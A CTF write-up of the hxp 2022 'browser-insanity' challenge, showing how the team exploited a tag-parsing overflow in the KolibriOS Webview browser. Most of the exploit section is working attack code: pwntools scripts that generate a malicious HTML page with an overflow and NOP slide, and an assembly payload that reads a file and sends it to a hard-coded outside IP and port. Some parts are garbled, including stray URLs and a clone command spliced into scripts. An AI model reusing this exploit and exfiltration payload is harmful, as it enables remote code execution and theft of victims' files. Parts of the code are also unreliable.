Author: 0x6fe1be2

Version: 12-03-23

# [hxp CTF](https://ctftime.org/event/1845) (10.3-12.3)

## browser-insanity

Status: solved (w0y)

Category: PWN, ZAJ (Awesome)

Teammates: m4ttm00ny, EspressoForLife

Points: 435 (14 Solves)



### TL;DR

browser-insanity is a pwn challenge that requires you to exploit a browser from a niche custom x86-32 Kernel called [KolibriOS](http://kolibrios.org/en/). The default Browser in KolibriOS called Webview only supports html.  Looking into the [source code](https://repo.or.cz/kolibrios.git/tree/7fc85957a89671d27f48181d15e386cd83ee7f1a) shows that there is an issue on how html tags are parsed. 

This allows us to create an indefinite recursion which actually overflows into executed code. This is possible because KolibriOS doesn't have any memory protection features like multiple pages and permissions. 

This overflow is used to jump into user controlled memory and prepare our RCE payload. At last we open a connection to our extraction URL and get the Flag. Exploit is at the end of the chapter.

### Intro

> **Description:**
>
> Ever wanted to hack a tiny OS written in x86-32 assembly and C--? Me neither but it’s hxp CTF 2022.
>
> Give us an URL, the user in the KolibriOS VM will visit it. You need to get the flag from /hd0/1/flag.txt
>
> The source code you could get from https://repo.or.cz/kolibrios.git/tree/7fc85957a89671d27f48181d15e386cd83ee7f1a
>
> The browser is at programs/cmm/browser in the source tree. It relies on a couple of different libraries (e.g. programs/develop/libraries), grep around.
>
> KolibriOS has its own debugger, DEBUG, available on the desktop. It may come in useful.
>
> The kernel ABI is at kernel/trunk/docs/sysfuncs.txt
>
> For building random pieces:
>
> INCLUDE=path_to_header.inc fasm -m 1000000 -s debug.s file.asm file.out
>
> Connection (mirrors):
>
>     nc 78.46.199.173 27499

#### File Structure

```bash
browser_insanity/
# Container setup scripts
browser_insanity/docker-compose.yml
browser_insanity/Dockerfile
browser_insanity/enter_challenge.py
browser_insanity/ynetd
# QEMU Setup
browser_insanity/run_vm.sh
browser_insanity/kolibri.img
browser_insanity/images/
browser_insanity/images/flag_fake.img
# POW
browser_insanity/pow-solver
browser_insanity/pow-solver.cpp
```

The most interesting files are *run_vm.sh*  and *enter_challenge.py* because it shows us how to start the KolibriOS Machine

*run_vm.sh*

```bash
#!/bin/sh

# The monitor is necessary to send mouse and keyboard events to write the address.
# For debugging, you may want to replace -nographic with -s

qemu-system-x86_64 \
	-cpu qemu64 \
	-smp 1 \
	-m 128 \
	-serial mon:stdio \
	-snapshot \
	-no-reboot \
	-boot a \
	-fda kolibri.img \
	-hda flag.img \
	-nographic
```

*enter_challenge.py* shows us how the service interacts with the machine, which can basically be summarized as visiting a given URL with the build-in Browser Webview.

### Test Environment

One of the hardest parts of the challenge was creating a prober Test Environment, because we need to learn a new Kernel and Debugging Tool.

#### Start Machine

by modifying  *run_vm.sh* we can get a graphical system

```bash
#!/bin/sh

qemu-system-x86_64 \
	-cpu qemu64 \
	-smp 1 \
	-m 1024 \
	-daemonize \git clone https://repo.or.cz/kolibrios.git 		# detach into graphics window
	-snapshot \
	-no-reboot \
	-boot a \
	-fda kolibri.img \											# Kolibri OS mounted to /syz/
	-hda images/flag_fake.img \									# flag.img mounted to /hd0/1/
```

#### https://enzo.run/posts/lactf2024/Mount and edit kolibriimg img

We can also mount the operating image to copy our own binaries for testing.

```bash
mkdir kolibriimg
sudo mount -o loop kolibri.img kolibriimg
```



#### Webview (Browser)

Webview is the integrated Browser of KolibriOS which we need to exploit. 

![Webview Browser](https://gfelber.dev/img/Webview.png)

####  KolibriOS DEBUG

Luckily KolibriOS has it's own integrated Debugging Tool which will be very useful.

![](http://wiki.kolibrios.org/images/2/25/Mtdbg_overview.png)

**Important Commands**

```
load <FILE_PATH>	# Load Programm e.g. load /sys/Network/Webview
g					# Start File
s					# step jmp into
n					# next jmp over
bpm w <ADDR>		# break on memory access write
d <ADDR>			# show data at ADDR
u <ADDR>			# show intructions at ADDR
terminate			# Terminate current session
```



#### Source Code

https://repo.or.cz/kolibrios.git/tree/7fc85957a89671d27f48181d15e386cd83ee7f1a

```bash
git clone https://repo.or.cz/kolibrios.git
cd kolibrios
git checkout 7fc85957a89671d27f48181d15e386cd83ee7f1a
```

##### File Structure

```bash
kolibrios						# root dir
...
kolibrios/kernel				# kernel code
...
kolibrios/programs				# programs inside os
...
kolibrios/programs/network		# networking programs (important for exploit)https://enzo.run/posts/lactf2024/
...
kolibrios/programs/cmm/browser	# browser
...
```



#### Compiling

http://wiki.kolibrios.org/wiki/Writing_applications_for_KolibriOS

```bash
fasm test.asm test
```

Included Files e.g. `include 'macros.inc'` need to be in the same directory, the best directory for compiling files is *kolibrios/programs/*



#### Syscalls

kernel/trunk/docs/sysfuncs.txt

There is a .txt file that explains the different Syscalls of the kernel. 

One interesting Quirk of this kernel is that similarly to a Commodore 64 the kernel provides APIs to render images and flip pixels.

Even though this seems useful for creating a payload at the end i decided that it would be easier to copy a payload together from different code samples.



#### Webview

programs/cmm/browser

* Only supports HTML (no CSS or JS)

##### `<html><body>`Header

These tags are required for rendering a page as html

##### `<a>`  Hyperlinks

Create Links to other pages, but also local programs (yeah wtf)

##### `<img>`  Images

Allows displaying data as image



#### KolibriOS



##### File Structure

```bash
/sys
/sys/3d
/sys/Demos
/sys/Develop
/sys/Develop/Examples
/sys/Drivers
/sys/Fonts
/sys/File Managers
/sys/Games
/sys/Lib
/sys/Media
/sys/Media/Imgf
/sys/Network
/sys/Network/Webview		# Executable we need to exploit
/sys/Settings
```



### Webview (Browser)

#### Debugging

**Important Addresses**

* `0x00000000` Base Address (Executed file)
* `0x00002800` Start of Stack
* `0x00003900` Location of our tag structure
* `0x00012b0f` Start of our tag write routine
* ~`0x00400000` User controlled Memory (probably heap) contains our Webpage



### Vulnerability

m4ttm00ny notized that there the browser crashes when a tag over the size of 32 char is specified. Sadly we never really found out where the unsafe source code is located it is probably this:

*programs/cmm/browser/TWB/TWB.c*

```c
void TWebBrowser::ParseHtml(dword _bufpointer, _bufsize){
    ...
        if (ESBYTE[bufpos] == '<') && (is_html) {
            if (strchr("!/?abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", ESBYTE[bufpos+1])) {
                bufpos++;
                if (tag.parse(#bufpos, bufpointer + bufsize)) {
                  ...
                }
                continue;
            }
        }
    ...
}

```



*programs/cmm/browser/TWB/parse_tag.h*

```c
...
struct _tag
{
	char name[32];
	char prior[32];
	bool opened;
	collection attributes;
	collection values;
	dword value;
	dword number;
	bool is();
	bool parse();
	dword get_next_param();
	dword get_value_of();
	signed get_number_of();
} tag=0;
...
bool _tag::parse(dword _bufpos, bufend) {
    	...
        // probably this
    	if (name) strcpy(#prior, #name); else prior = '\0';
    	...
}
```

We spend some time trying to understand why exactly this causes the code to crash

Looking at memory after the crash shows that memory is filled with our 32 byte tag.

After spending some more time in the debugger EspressoForLife and I concluded that we actually overflow into executed code (This wasn't as obvious as in gdb, because errors make the instruction pointer jump to the start of the page `0x00000000`, not showing an invalid instruction was executed).



### Exploitation

#### Exploiting Overflow

##### Analysis

We create a simple webpage that crashes the browser

```python
#!/bin/python
from pwn import *

HEADER = b'<html><body>'

def tagger(tag):
  return b'<' + tag + b'/>'

with open('exploit.htm', 'wb') as exploithtm:
  exploithtm.write(HEADER)
  exploithtm.write(tagger(cyclic(0x20)))
```

NOTE: Webview has a strong cache setting, therefore cache needs to be cleared before each visit with CTRL+F5

If we now open our program and set a write breakpoint at 0x12b0e (with `bpm w 12b0e`) we can see our write routine and how our overwrite happens

![image-20230313104920207](https://gfelber.dev/img/anal_over_dbg.png)

Using `cylic_find('acaa')+4` we see that the overflow starts after 11 chars. We also see that our overwrite routine checks for null bytes with `test al, al`, which is why we need to exclude null chars. We can now rewrite our script to jmp into our tag like this:

```python
#!/bin/python
from pwn import *

HEADER = b'<html><body>'
MAX_LENGTH=0x100000

def tagger(tag):
  return b'<' + tag + b'/>'

gen = cyclic_gen()
exploit = gen.get(0xb)
# don't overwrite lodsb intruction to keep overwrite routine going
exploit += asm('lodsb')
# jmp location doesn't matter because we only write the first byte
exploit += asm('jmp $')
# realine gen.get
gen.get(len(exploit)-0xb)
# make sure our exploit is 
exploit += gen.get(0x20 - len(exploit))

print(exploit.hex())
with open('test.htm', 'wb') as exploithtm:
  exploithtm.write(HEADER)
  exploithtm.write(tagger(exploit))
```

![image-20230313104920207](https://gfelber.dev/img/jmp_over_dbg.png)

We once again use `cyclic_find('aafa')` to see our first code execution starts at offset 18.

##### Jumping to User controlled memory

Because our controlled code execution starts at offset 18 we only have about 14 bytes of RCE (32-18), which isn't enought to read and extract our flag, that is why we need to jmp into user controlled memory, were we can execute more Instructions.

```python
#!/bin/python
from pwn import *

HEADER = b'<html><body>'
MAX_LENGTH=0x100000


def tagger(tag):
  return b'<' + tag + b'/>'

gen = cyclic_gen()
exploit = gen.get(0xb)
exploit += asm('lodsb')
exploit += asm('jmp $')
# align cyclic
gen.get(len(exploit)-0xb)
# align tag
exploit + = gen.get(0x12)
# 9 byte exploit goes here
exploit += b''
# make sure our exploit is 32 chars long
# align cyclic
gen.get(len(exploit)-0x12)
exploit += gen.get(0x20 - len(exploit))

print(exploit.hex())
with open('test.htm', 'wb') as exploithtm:
  exploithtm.write(HEADER)
  exploithtm.write(tagger(exploit))
  # append a lot of characters
  exploithtm.write(cyclic(MAX_LENGTH, alphabet=string.printable.encode()))
```



![Add user controlled memory](https://gfelber.dev/img/user_controlled_memory.png)

After allocating a lot of memory through adding a lot of characters (`0x100000`) we can jump through memory in `0x100000` steps to see were our data is written and we find out, that `0x400000` hast allocated our data.

We can use this knowledge to rewrite our exploit to jmp to `0x400000` and place a NOP slide at user controlled memory

```python
#!/bin/python
from pwn import *

HEADER = b'<html><body>'
MAX_LENGTH=0x100000

def nop(size):
  return b'\x90' * size

def tagger(tag):
  return b'<' + tag + b'/>'

TAG_LENGTH = 0x20
OVERFLOW_START = 0xb
JMP_CODE = 0x12
gen = cyclic_gen()
exploit = gen.get(OVERFLOW_START)
exploit += asm('lodsb')
exploit += asm('jmp $')
exploit += gen.get(JMP_CODE - len(exploit))
# 14 byte exploit goes here
exploit += asm('xor eax, eax')
exploit += asm('mov al, 0x40')
exploit += asm('shl eax, 0x10')
exploit += asm('jmp eax')
# make sure our exploit is 32 chars long
exploit += gen.get(TAG_LENGTH - len(exploit))

print(exploit.hex())
with open('test.htm', 'wb') as exploithtm:
  exploithtm.write(HEADER)
  exploithtm.write(tagger(exploit))
  # append a lot of NOPs
  exploithtm.write(nop(MAX_LENGTH))
```

![Exploit Over JMP](https://gfelber.dev/img/exploit_over_dbg.png)

We can now append our payload to the nop slide and get arbitary code execution

#### Setup Payload

Now we only need to create a payload. Because I didn't want to learn how SYSCALLS work in this Operating system i decided to create a setup script that copies a payload at the into the base address at `0x00000000` which makes it possible to compile payload with fasm.

```python
#!/bin/python
from pwn import *

HEADER = b'<html><body>'
MAX_LENGTH=0x100000

def nop(size):
  return b'\x90' * size

def tagger(tag):
  return b'<' + tag + b'/>'


# create exploit
...

# setup payload
 
# read payload from compiled binary
PAYLOAD_FILE='./test'
ENTRY = 0x24

with open(PAYLOAD_FILE, 'rb') as test:
 payload = test.read()

# set MOV destination (edi) to base address 0x00000000
setup = asm('xor edi, edi')
# MOV the entire payload to destination
setup += asm(f'mov ecx, {len(payload)}')
# trick we use to set the source to current EIP
get_eip = asm('call $+5')
print(get_eip.hex(), len(get_eip))
setup += get_eip
setup += asm('pop esi')
# Add offset from EIP to start of payload
setup += asm('add esi, 13')
# MOV PAYLOAD to destination
setup += asm('rep movsb')
# jmp to ENTRYPOINT
setup += asm(f'mov eax, {ENTRY}')
setup += asm(f'jmp eax')
# Combine setup and payload
payload = setup + payload
# Append nopslide
payload = nop(MAX_LENGTH-len(payload)) + payload


print(exploit.hex())
with open('test.htm', 'wb') as exploithtm:
  exploithtm.write(HEADER)
  exploithtm.write(tagger(exploit))
  # append payload
  exploithtm.write(payload)
```

We can get the entrypoint either by copying the binary to the kolbri.img and load it into the debugger or read the file header with:

```bash
> head test -c 16 | hexdump -C
00000000  4d 45 4e 55 45 54 30 31  01 00 00 00 24 00 00 00  |MENUET01....$...|
00000010
```

In this case the Entrypoint is `0x24`

And It works:

![Setup test](https://gfelber.dev/img/setup.png)

#### Payload

In order to read and extract the flag we need to understand the kernel, especially syscalls. Even though there isn't any good documentation we are provide a lot of sample programs in the repository. The most interesting ones are:

* *programs/network/telnet/telnet.asm* 

  a telnet implementation for KolibriOS that can be used for creating a remote connection to our extraction URL

* *programs/network/pasta/pasta.asm* 

  a tool that sends files or clipboard content to [dpaste.com](http://dpaste.com), this gives us an example on how to read files



we use *programs/network/telnet/telnet.asm* as our template

```assembly
...
; send data routine
thread:
        mcall   40, 0

        mcall   68, 12, 32768						; read flag file
        test    eax, eax
        jz      .error
        mov     [file_struct.buf], eax
        mov     [clipboard_data], eax
        mcall   70, file_struct
        cmp     eax, 6
        jne     .error
        mov     [clipboard_data_length], ebx
        mov     eax, [clipboard_data]

        jmp .loop
        
  .error:
        mov     ecx, 0xc
        mov     esi, file_error
        mov     edi, clipboard_data
        rep movsb


  ; send data to Remote
  .loop:
        mov     ebx, [counter]
        mov     esi, [clipboard_data]
        add     esi, ebx
        add     ebx, 2
        mov     [counter], ebx
        mov     ax, [esi]
        mov     [send_data], ax
        xor     esi, esi
        inc     esi
        test    al, al
        jz      done
        inc     esi
        mcall   send, [socketnum], send_data		; send data to remote URL

        invoke  con_get_flags
        jmp      .loop
...
socketnum       dd ?								
buffer_ptr      rb BUFFERSIZE+1						
file_error      db 'Error with file', 0xa, 0, 0		
file_done       db 'File loaded', 0xa, 0, 0			
param           db '/hd0/1/flag.txt', 0				; file to extract
send_data       dw ?
counter         dd 0
identifier              dd 0
clipboard_data          dd 0						; file data ptr
clipboard_data_length   dd 0
send_ptr                dd ?

hostname        db '10.0.2.2:42069', 0			; extraction URL 

file_struct:
        dd 0            ; read file
        dd 0            ; offset
        dd 0            ; reserved
        dd 32768        ; max file size
  .buf  dd 0            ; buffer ptr
        db 0
        dd param

mem:
```



Now we finalize our generator script and get:

```python
#!/bin/python
from pwn import *

HEADER = b'<html><body>'
MAX_LENGTH=0x100000

def nop(size):
  return b'\x90' * size

def tagger(tag):
  return b'<' + tag + b'/>'

# create exploit


# setup payload
 
# read payload from compiled binary
PAYLOAD_FILE='./programs/payload'
ENTRY = 0x1a1

with open(PAYLOAD_FILE, 'rb') as test:
 payload = test.read()

# set MOV destination (edi) to base address 0x00000000
setup = asm('xor edi, edi')
# MOV the entire payload to destination
setup += asm(f'mov ecx, {len(payload)}')
# trick we use to set the source to current EIP
get_eip = asm('call $+5')
print(get_eip.hex(), len(get_eip))
setup += get_eip
setup += asm('pop esi')
# Add offset from EIP to start of payload
setup += asm('add esi, 13')
# MOV PAYLOAD to destination
setup += asm('rep movsb')
# jmp to ENTRYPOINT
setup += asm(f'mov eax, {ENTRY}')
setup += asm(f'jmp eax')
# Combine setup and payload
payload = setup + payload
# Append nopslide
payload = nop(MAX_LENGTH-len(payload)) + payload
payload_wrap =  b"<img src='data:base64,'" + payload + b"'/>"


print(exploit.hex())
with open('test.htm', 'wb') as exploithtm:
  exploithtm.write(HEADER)
  exploithtm.write(tagger(exploit))
  # append a lot of characters
  exploithtm.write(payload_wrap)
```

And we managed to extract the fake flag!!!

![test extract](https://gfelber.dev/img/test_extract.png)

Now we only need to make our website and extract port publicly visible and we WIN!!!

### Final Solution

*exploit_gen.py*

```python
#!/bin/python
from pwn import *

HEADER = b'<html><body>'
MAX_LENGTH=0x100000
ENTRY = 0x1A1
out = []
  
PAYLOAD_FILE='./programs/payload'
# PAYLOAD_FILE='./test'

with open(PAYLOAD_FILE, 'rb') as test:
 payload = test.read()

setup = asm('xor edi, edi')
setup += asm(f'mov ecx, {len(payload)}')
get_eip = asm('call $+5')
print(get_eip.hex(), len(get_eip))
setup += get_eip
setup += asm('pop esi')
setup += asm('add esi, 13')
setup += asm('rep movsb')
setup += asm(f'mov eax, {ENTRY}')
setup += asm(f'jmp eax')
print(7, len(setup), setup.hex())
payload = setup + payload
payload = (b'\x90'*(MAX_LENGTH-len(payload))) + payload

IMG = b'<img src="data:image/png;base64,'+  payload +   b'" />'

def nop(size):
  return b'\x90' * size

def tagger(tag):
  return b'<' + tag + b'/>'

def vtagger(tag):
  return tagger(b'a' + tag)

def ctagger(size):
  return tagger(cyclic(size))

def otagger(tag):
  padding = cyclic(0x1f)
  return tagger(padding+tag)

exploit = b'a'
exploit += nop(0xa)
exploit += b'\xac'
exploit += asm('jmp $-0x1d')
exploit += nop(4)
exploit += asm('xor eax, eax', arch='i386')
exploit += asm('mov al, 0x40', arch='i386')
exploit += asm('shl eax, 0x10', arch='i386')
exploit += asm('mov ax, 0x0101', arch='i386')
exploit += asm('jmp eax', arch='i386')
exploit += nop(0x20-len(exploit))
print(exploit.hex())
with open('exploit.htm', 'wb') as exploithtm:
  exploithtm.write(HEADER)
  exploithtm.write(tagger(exploit))
  exploithtm.write(IMG)
```



*payload.asm*

```assembly
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;                                                                 ;;
;; Copyright (C) KolibriOS team 2010-2015. All rights reserved.    ;;
;; Distributed under terms of the GNU General Public License       ;;
;;                                                                 ;;
;;  telnet.asm - Telnet client for KolibriOS                       ;;
;;                                                                 ;;
;;  Written by hidnplayr@kolibrios.org                             ;;
;;                                                                 ;;
;;          GNU GENERAL PUBLIC LICENSE                             ;;
;;             Version 2, June 1991                                ;;
;;                                                                 ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

format binary as ""

BUFFERSIZE      = 4096

use32
; standard header
        db      'MENUET01'      ; signature
        dd      1               ; header version
        dd      start           ; entry point
        dd      i_end           ; initialized size
        dd      mem+4096        ; required memory
        dd      mem+4096        ; stack pointer
        dd      hostname        ; parameters
        dd      0               ; path

include 'macros.inc'
purge mov,add,sub
include 'proc32.inc'
include 'dll.inc'
include 'network.inc'

; entry point
start:
; load libraries
        stdcall dll.Load, @IMPORT
        test    eax, eax
        jnz     exit
; initialize console
        invoke  con_start, 1
        invoke  con_init, 80, 25, 80, 25, title

; Check for parameters
        cmp     byte[hostname], 0
        jne     resolve

main:
        invoke  con_cls
; Welcome user
        invoke  con_write_asciiz, str1

prompt:
; write prompt
        invoke  con_write_asciiz, str2
; read string (wait for input)
        mov     esi, hostname
        invoke  con_gets, esi, 256
; check for exit
        test    eax, eax
        jz      done
        cmp     byte[esi], 10
        jz      done

resolve:
        mov     [sockaddr1.port], 23 shl 8      ; Port is in network byte order

; delete terminating newline from URL and parse port, if any.
        mov     esi, hostname
  @@:
        lodsb
        cmp     al, ':'
        je      .do_port
        cmp     al, 0x20
        ja      @r
        mov     byte[esi-1], 0
        jmp     .done

  .do_port:
        xor     eax, eax
        xor     ebx, ebx
        mov     byte[esi-1], 0
  .portloop:
        lodsb
        cmp     al, ' '
        jbe     .port_done
        sub     al, '0'
        jb      hostname_error
        cmp     al, 9
        ja      hostname_error
        lea     ebx, [ebx*4+ebx]
        shl     ebx, 1
        add     ebx, eax
        jmp     .portloop

  .port_done:
        xchg    bl, bh
        mov     [sockaddr1.port], bx

  .done:

; resolve name
        push    esp     ; reserve stack place
        invoke  getaddrinfo, hostname, 0, 0, esp
        pop     esi
; test for error
        test    eax, eax
        jnz     dns_error

        invoke  con_cls
        invoke  con_write_asciiz, str3
        invoke  con_write_asciiz, hostname

; write results
        invoke  con_write_asciiz, str8

; convert IP address to decimal notation
        mov     eax, [esi+addrinfo.ai_addr]
        mov     eax, [eax+sockaddr_in.sin_addr]
        mov     [sockaddr1.ip], eax
        invoke  inet_ntoa, eax
; write result
        invoke  con_write_asciiz, eax
; free allocated memory
        invoke  freeaddrinfo, esi

        invoke  con_write_asciiz, str9

        mcall   socket, AF_INET4, SOCK_STREAM, 0
        cmp     eax, -1
        jz      socket_err
        mov     [socketnum], eax

        mcall   connect, [socketnum], sockaddr1, 18
        test    eax, eax
        jnz     socket_err

        mcall   40, EVM_STACK
        invoke  con_cls

        mcall   18, 7
        push    eax
        mcall   51, 1, thread, mem - 2048
        pop     ecx
        mcall   18, 3

mainloop:
        invoke  con_get_flags
        test    eax, 0x200                      ; con window closed?
        jnz     exit

        mcall   recv, [socketnum], buffer_ptr, BUFFERSIZE, 0
        cmp     eax, -1
        je      closed

        mov     esi, buffer_ptr
        lea     edi, [esi+eax]
        mov     byte[edi], 0
  .scan_cmd:
        cmp     byte[esi], 0xff         ; Interpret As Command
        jne     .no_cmd
; TODO: parse options
; for now, we will reply with 'WONT' to everything
        mov     byte[esi+1], 252        ; WONT
        add     esi, 3                  ; a command is always 3 bytes
        jmp     .scan_cmd
  .no_cmd:

        cmp     esi, buffer_ptr
        je      .print

        push    esi edi
        sub     esi, buffer_ptr
        mcall   send, [socketnum], buffer_ptr, , 0
        pop     edi esi

  .print:
        cmp     esi, edi
        jae     mainloop

        invoke  con_write_asciiz, esi

  .loop:
        lodsb
        test    al, al
        jz      .print
        jmp     .loop


socket_err:
        invoke  con_write_asciiz, str6
        jmp     prompt

dns_error:
        invoke  con_write_asciiz, str5
        jmp     prompt

hostname_error:
        invoke  con_write_asciiz, str11
        jmp     prompt

closed:
        invoke  con_write_asciiz, str12
        jmp     prompt

done:
        invoke  con_exit, 1
exit:

        mcall   close, [socketnum]
        mcall   -1



thread:
        mcall   40, 0

        ; read flag file
        mcall   68, 12, 32768
        test    eax, eax
        jz      .error
        mov     [file_struct.buf], eax
        mov     [clipboard_data], eax
        mcall   70, file_struct
        cmp     eax, 6
        jne     .error
        mov     [clipboard_data_length], ebx
        mov     eax, [clipboard_data]

        jmp .loop

  .error:
        mov     ecx, 0xc
        mov     esi, file_error
        mov     edi, clipboard_data
        rep movsb


  .loop:
        ; invoke  con_getch2
        mov     ebx, [counter]
        mov     esi, [clipboard_data]
        add     esi, ebx
        add     ebx, 2
        mov     [counter], ebx
        mov     ax, [esi]
        mov     [send_data], ax
        xor     esi, esi
        inc     esi
        test    al, al
        jz      done
        inc     esi
  @@:
        mcall   send, [socketnum], send_data

        invoke  con_get_flags
        jmp      .loop




; data
title   db      'Telnet',0
str1    db      'Telnet for KolibriOS',10,10,\
                'Please enter URL of telnet server (host:port)',10,10,\
                'fun stuff:',10,\
                'telehack.com            - arpanet simulator',10,\
                'towel.blinkenlights.nl  - ASCII Star Wars',10,\
                'nyancat.dakko.us        - Nyan cat',10,10,0
str2    db      '> ',0
str3    db      'Connecting to ',0
str4    db      10,0
str8    db      ' (',0
str9    db      ')',10,0

str5    db      'Name resolution failed.',10,10,0
str6    db      'Could not open socket.',10,10,0
str11   db      'Invalid hostname.',10,10,0
str12   db      10,'Remote host closed the connection.',10,10,0

; 146.70.116.152:54963
sockaddr1:
        dw AF_INET4
.port   dw 0
.ip     dd 0 ; 146.70.116.152
        rb 10

align 4
@IMPORT:

library network, 'network.obj', console, 'console.obj'
import  network,        \
        getaddrinfo,    'getaddrinfo',  \
        freeaddrinfo,   'freeaddrinfo', \
        inet_ntoa,      'inet_ntoa'
import  console,        \
        con_start,      'START',        \
        con_init,       'con_init',     \
        con_write_asciiz,       'con_write_asciiz',     \
        con_exit,       'con_exit',     \
        con_gets,       'con_gets',\
        con_cls,        'con_cls',\
        con_getch2,     'con_getch2',\
        con_set_cursor_pos, 'con_set_cursor_pos',\
        con_write_string, 'con_write_string',\
        con_get_flags,  'con_get_flags'


i_end:

socketnum       dd ?
buffer_ptr      rb BUFFERSIZE+1
file_error      db 'Error with file', 0xa, 0, 0
file_done       db 'File loaded', 0xa, 0, 0

; file to extract
param           db '/hd0/1/flag.txt', 0
send_data       dw ?
counter         dd 0
identifier              dd 0
clipboard_data          dd 0
clipboard_data_length   dd 0
send_ptr                dd ?

; extraction URL IP:PORT
hostname        db '91.92.116.5:42069', 0

file_struct:
        dd 0            ; read file
        dd 0            ; offset
        dd 0            ; reserved
        dd 32768        ; max file size
  .buf  dd 0            ; buffer ptr
        db 0
        dd param

mem:
```



Flag: `hxp{wHy_h4cK_Chr0m3_wh3n_y0u_c4n_hAcK_BROWSER}`
